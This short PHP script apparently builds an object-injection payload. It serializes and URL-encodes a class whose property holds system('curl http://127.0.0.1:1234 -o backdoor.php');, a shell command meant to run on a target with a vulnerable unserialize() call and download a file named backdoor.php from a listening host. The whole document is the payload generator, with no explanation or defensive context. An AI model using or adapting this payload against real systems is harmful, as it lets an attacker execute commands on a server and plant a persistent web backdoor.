<?php
	class PHPClass
	{
		public $condition = true;
		public $prop = "system('curl http://127.0.0.1:1234 -o backdoor.php');";
	}
	echo urlencode(serialize(new PHPClass));
?>
